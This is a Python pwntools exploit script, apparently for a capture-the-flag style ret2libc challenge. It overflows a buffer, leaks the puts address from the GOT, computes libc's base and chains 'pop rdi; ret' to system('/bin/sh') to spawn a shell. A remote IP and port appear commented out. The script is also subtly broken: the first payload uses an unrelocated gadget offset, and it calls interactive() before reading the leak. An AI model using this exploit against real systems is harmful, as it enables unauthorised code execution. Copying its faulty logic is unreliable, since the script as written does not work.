#!/usr/bin/env python3
from pwn import *

# Addresses and offsets
puts_plt = 0x401060  # Address of puts in the PLT
puts_got = 0x404018  # Address of puts in the GOT
main_addr = 0x4011a0  # Address of the main function

# Offsets to libc functions (determine these using your libc version)
system_offset = 0x0000000000050d70  # Offset for the 'system' function in libc
bin_sh_offset = 0x00000000001d8678  # Offset for '/bin/sh' string in libc
puts_offset = 0x00000000000809c0    # Offset for the 'puts' function in libc
pop_rdi_ret_offset = 0x000000000002a3e5  # Offset for 'pop rdi; ret' gadget in libc (example, check your libc)

# Offset to the return address (determined using a cyclic pattern)
offset = 136

# Start the process or connect to the remote service
r = process('./ret2libc')
# r = remote('140.113.24.241', 30173)

# Step 1: Leak the address of puts
payload = b'A' * offset
payload += p64(pop_rdi_ret_offset)  # Gadget to pop the address into RDI
payload += p64(puts_got)     # Address of puts in the GOT
payload += p64(puts_plt)     # Call puts
payload += p64(main_addr)    # Return to main to reuse the process

# Send the payload to leak the address
r.sendline(payload)
r.interactive()
r.recvline()  # Skip any additional output before the address
leaked_puts = u64(r.recvline().strip().ljust(8, b'\x00'))

print(f"Leaked puts address: {hex(leaked_puts)}")

# Step 2: Calculate the base address of libc
libc_base = leaked_puts - puts_offset

print(f"Libc base address: {hex(libc_base)}")

# Calculate the actual address of the 'pop rdi; ret' gadget using the base address
pop_rdi_ret = libc_base + pop_rdi_ret_offset

# Step 3: Calculate the addresses of system, "/bin/sh", and the gadget
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

print(f"system address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(bin_sh_addr)}")
print(f"pop rdi; ret address: {hex(pop_rdi_ret)}")

# Step 4: Create the final payload to get a shell
payload = b'A' * offset
payload += p64(pop_rdi_ret)  # Address of 'pop rdi; ret' gadget from libc
payload += p64(bin_sh_addr)  # Address of "/bin/sh" string in libc
payload += p64(system_addr)  # Address of system() in libc

# Send the payload to get a shell
r.sendline(payload)

# Interact with the shell
r.interactive()
